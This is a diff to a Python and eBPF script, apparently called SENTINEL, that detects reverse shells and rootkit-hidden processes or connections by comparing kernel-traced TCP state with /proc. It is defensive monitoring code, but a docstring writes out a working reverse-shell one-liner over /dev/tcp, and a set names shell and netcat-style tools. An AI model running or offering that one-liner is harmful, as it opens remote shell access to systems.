@@ -1,13 +1,26 @@
+#!/usr/bin/python3
 from bcc import BPF
-import socket
-import struct
-import time
+import os, time, socket, struct
+from datetime import datetime
 
-prog = """
-#include <linux/sched.h>
-#include <linux/socket.h>
+# --- LOGGING SETUP ---
+LOG_FILE = "/var/log/sentinel/alerts.log"
+os.makedirs("/var/log/sentinel", exist_ok=True)
 
-struct connection {
+def log_alert(alert_type, message):
+    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    log_line = f"{timestamp} | NETWORK | {alert_type} | {message}"
+    with open(LOG_FILE, 'a') as f:
+        f.write(log_line + "\n")
+    print(log_line)
+
+# --- eBPF PROGRAM ---
+ebpf_code = """
+#include <uapi/linux/ptrace.h>
+#include <net/sock.h>
+#include <bcc/proto.h>
+
+struct conn_t {
     u32 pid;
     char comm[16];
     u32 saddr;
@@ -16,126 +29,205 @@ struct connection {
     u16 dport;
 };
 
-BPF_HASH(connections, u32, struct connection);
+BPF_HASH(connections, u64, struct conn_t);
 
-int trace_tcp_connect(struct pt_regs *ctx) {
-    struct connection conn = {};
+int trace_tcp_state(struct pt_regs *ctx, struct sock *sk, int state) {
+    u64 key = bpf_get_current_pid_tgid();
+    u32 pid = key >> 32;
+    struct conn_t conn = {};
+    u16 family = 0;
 
-    conn.pid = bpf_get_current_pid_tgid() >> 32;
+    bpf_probe_read(&family, sizeof(family), &sk->__sk_common.skc_family);
+    if (family != 2) return 0;  // IPv4 only
+
+    conn.pid = pid;
     bpf_get_current_comm(&conn.comm, sizeof(conn.comm));
+    bpf_probe_read(&conn.saddr, sizeof(conn.saddr), &sk->__sk_common.skc_rcv_saddr);
+    bpf_probe_read(&conn.daddr, sizeof(conn.daddr), &sk->__sk_common.skc_daddr);
+    bpf_probe_read(&conn.sport, sizeof(conn.sport), &sk->__sk_common.skc_num);
+    bpf_probe_read(&conn.dport, sizeof(conn.dport), &sk->__sk_common.skc_dport);
 
-    connections.update(&conn.pid, &conn);
+    // Capture SYN_SENT(2), ESTABLISHED(1), LISTEN(10)
+    if (state == 1 || state == 2 || state == 10) {
+        connections.update(&key, &conn);
+    }
+    // Cleanup on CLOSE_WAIT(8) or FIN_WAIT(7)
+    if (state == 7 || state == 8) {
+        connections.delete(&key);
+    }
     return 0;
 }
 
-int trace_tcp_close(struct pt_regs *ctx) {
-    u32 pid = bpf_get_current_pid_tgid() >> 32;
-    connections.delete(&pid);
+int trace_tcp_close(struct pt_regs *ctx, struct sock *sk) {
+    u64 key = bpf_get_current_pid_tgid();
+    connections.delete(&key);
     return 0;
 }
 """
 
-def int_to_ip(addr):
-    return socket.inet_ntoa(struct.pack("I", addr))
+# --- CONFIGURATION ---
+DASHBOARD_IP = "192.168.1.75"
+
+IGNORE_PROCESSES = {
+    "ksoftirqd", "swapper", "kworker", "kthreadd", "rcu_sched",
+    "migration", "watchdog", "systemd", "sshd", "kdevtmpfs",
+    "netns", "khelper", "kaluad", "jbd2", "ext4", "loop", "rpciod"
+}
+
+# Processes that are suspicious ONLY when their stdio is redirected to a socket
+SHELL_PROCS = {
+    "bash", "sh", "dash", "python", "python3",
+    "perl", "ruby", "php", "nc", "ncat", "netcat", "socat"
+}
+
+alerted_connections = set()
+
+# --- HELPERS ---
+
+def ip_str(packed):
+    try:
+        return socket.inet_ntoa(struct.pack("<I", packed))
+    except Exception:
+        return "0.0.0.0"
 
 def get_proc_connections():
-    connections = []
+    """
+    Read active connections visible in userspace via /proc/net/tcp.
+    A rootkit hiding connections will manipulate this file.
+    """
+    conns = set()
     try:
-        with open('/proc/net/tcp', 'r') as f:
-            lines = f.readlines()[1:]
-            for line in lines:
+        with open("/proc/net/tcp") as f:
+            for line in f.readlines()[1:]:
                 parts = line.strip().split()
                 if len(parts) < 4:
                     continue
-                local = parts[1]
-                remote = parts[2]
-                state = parts[3]
-                local_ip = int_to_ip(int(local.split(':')[0], 16))
-                local_port = int(local.split(':')[1], 16)
-                remote_ip = int_to_ip(int(remote.split(':')[0], 16))
-                remote_port = int(remote.split(':')[1], 16)
-                connections.append({
-                    'local': f"{local_ip}:{local_port}",
-                    'remote': f"{remote_ip}:{remote_port}",
-                    'state': state
-                })
-    except Exception as e:
-        print(f"[!] Error reading /proc/net/tcp: {e}")
-    return connections
+                rem = parts[2].split(":")
+                rem_ip = socket.inet_ntoa(struct.pack("<I", int(rem[0], 16)))
+                rem_port = int(rem[1], 16)
+                conns.add(f"{rem_ip}:{rem_port}")
+    except Exception:
+        pass
+    return conns
 
-def check_connections():
-    print("\n[*] Checking network connections...")
-    print("-" * 50)
+def is_ignored_process(comm):
+    comm_lower = comm.lower()
+    for ignore in IGNORE_PROCESSES:
+        if ignore in comm_lower:
+            return True
+    return False
 
-    proc_conns = get_proc_connections()
-    kernel_conns = b["connections"]
+def is_dashboard_connection(dst_ip, dport):
+    return dst_ip == DASHBOARD_IP or dport == 5000
 
-    states = {
-        '01': 'ESTABLISHED',
-        '0A': 'LISTEN',
-        '06': 'TIME_WAIT',
-        '08': 'CLOSE_WAIT'
-    }
+def is_stdio_socket(pid):
+    """
+    Check if stdin(0), stdout(1), stderr(2) are redirected to a socket.
 
-    listening = [c for c in proc_conns if c['state'] == '0A']
-    established = [c for c in proc_conns if c['state'] == '01']
+    Real reverse shell:
+        bash -i >& /dev/tcp/x.x.x.x/4444 0>&1
+        → /proc/<pid>/fd/0,1,2 all point to  socket:[inode]  ← FLAGGED
 
-    print(f"[*] Total connections in /proc: {len(proc_conns)}")
-    print(f"[*] Listening ports:            {len(listening)}")
-    print(f"[*] Established connections:    {len(established)}")
+    Plain connection:
+        nc 192.168.1.65 4444
+        → /proc/<pid>/fd/0,1,2 point to /dev/pts/X (terminal) ← NOT flagged
 
-    if listening:
-        print("\n[*] Listening ports:")
-        for c in listening:
-            print(f"    {c['local']}")
+    Returns True only if at least 2 of 3 stdio fds point to a socket.
+    """
+    socket_fds = 0
+    try:
+        for fd in [0, 1, 2]:
+            try:
+                link = os.readlink(f"/proc/{pid}/fd/{fd}")
+                if link.startswith("socket:"):
+                    socket_fds += 1
+            except Exception:
+                pass
+    except Exception:
+        pass
+    return socket_fds >= 2
 
-    if established:
-        print("\n[*] Established connections:")
-        for c in established:
-            print(f"    {c['local']} -> {c['remote']}")
+# --- CORE AUDIT ---
 
-    # Check kernel tracked connections
-    print(f"\n[*] Kernel tracked connections: {len(kernel_conns)}")
+def run_audit(b):
+    global alerted_connections
 
-    # Find hidden connections
-    proc_remotes = set(c['remote'] for c in proc_conns)
-    hidden = []
-    for pid, conn in kernel_conns.items():
-        daddr = int_to_ip(conn.daddr)
+    visible_pids = set(int(d) for d in os.listdir("/proc") if d.isdigit())
+    proc_conns   = get_proc_connections()
+    kernel_map   = b["connections"]
+
+    for key, conn in kernel_map.items():
+        pid   = conn.pid
+        comm  = conn.comm.decode("utf-8", errors="replace").strip()
+        dst   = ip_str(conn.daddr)
         dport = socket.ntohs(conn.dport)
-        remote = f"{daddr}:{dport}"
-        if remote not in proc_remotes and daddr != '0.0.0.0':
-            hidden.append({
-                'pid': pid.value,
-                'comm': conn.comm.decode('utf-8', errors='replace'),
-                'remote': remote
-            })
 
-    if hidden:
-        print(f"\n[!!!] HIDDEN CONNECTIONS: {len(hidden)}")
-        for h in hidden:
-            print(f"    PID: {h['pid']} | {h['comm']} -> {h['remote']}")
-    else:
-        print("[OK] No hidden connections detected")
+        if dport == 0:
+            continue
+        if is_ignored_process(comm):
+            continue
+        if is_dashboard_connection(dst, dport):
+            continue
 
-print("SENTINEL - Network Connection Detector")
-print("=" * 60)
+        alert_key = f"{pid}:{comm}:{dst}:{dport}"
+        if alert_key in alerted_connections:
+            continue
 
-b = BPF(text=prog)
-b.attach_kprobe(event="tcp_connect", fn_name="trace_tcp_connect")
-b.attach_kprobe(event="tcp_close", fn_name="trace_tcp_close")
+        pid_hidden  = pid not in visible_pids
+        conn_str    = f"{dst}:{dport}"
+        conn_hidden = conn_str not in proc_conns
 
-print("Monitoring network connections...")
-print("Press CTRL+C to stop\n")
+        # --- REVERSE SHELL DETECTION ---
+        # Condition: process is a shell/interpreter AND its stdio fds point to a socket.
+        # This separates `bash -i >& /dev/tcp/...` (flagged)
+        # from plain `nc host port`               (not flagged)
+        if comm in SHELL_PROCS and is_stdio_socket(pid):
+            log_alert("REVERSE_SHELL",
+                      f"PID={pid}|PROC={comm}|DEST={dst}:{dport}|"
+                      f"REASON=stdio_redirected_to_socket")
+            alerted_connections.add(alert_key)
+            continue
 
-counter = 0
+        # --- HIDDEN PROCESS WITH NETWORK ACTIVITY ---
+        # eBPF sees the PID but /proc listing does not (kernel rootkit hiding it)
+        if pid_hidden and dport > 1024:
+            log_alert("HIDDEN_PROCESS_NETWORK",
+                      f"PID={pid}|PROC={comm}|DEST={dst}:{dport}|"
+                      f"REASON=pid_missing_from_proc")
+            alerted_connections.add(alert_key)
+            continue
+
+        # --- HIDDEN CONNECTION ---
+        # eBPF sees the connection but /proc/net/tcp does not (rootkit hiding it)
+        if conn_hidden:
+            log_alert("HIDDEN_CONNECTION",
+                      f"PID={pid}|PROC={comm}|DEST={dst}:{dport}|"
+                      f"REASON=conn_missing_from_proc_net_tcp")
+            alerted_connections.add(alert_key)
+            continue
+
+    # NOTE: Do NOT call kernel_map.clear()
+    # eBPF manages its own cleanup via trace_tcp_close and tcp_set_state hooks.
+    if len(alerted_connections) > 500:
+        alerted_connections.clear()
+
+# --- ENTRY POINT ---
+
+print("[*] SENTINEL Network Detector Started")
+print(f"[*] Logging  → {LOG_FILE}")
+print("[*] Detecting → REVERSE_SHELL | HIDDEN_PROCESS_NETWORK | HIDDEN_CONNECTION")
+print("[*] Method    → eBPF kprobe on tcp_set_state + /proc/fd stdio socket check\n")
+
+b = BPF(text=ebpf_code)
+b.attach_kprobe(event="tcp_set_state", fn_name="trace_tcp_state")
+b.attach_kprobe(event="tcp_close",     fn_name="trace_tcp_close")
+
+print("[*] kprobes attached: tcp_set_state, tcp_close")
+print("[*] Audit interval: 3 seconds\n")
+
 try:
     while True:
-        time.sleep(1)
-        counter += 1
-        if counter % 10 == 0:
-            check_connections()
-            print("-" * 60)
-
+        run_audit(b)
+        time.sleep(3)
 except KeyboardInterrupt:
-    print("\nSENTINEL stopped.")
+    print("\n[!] Stopping SENTINEL...")
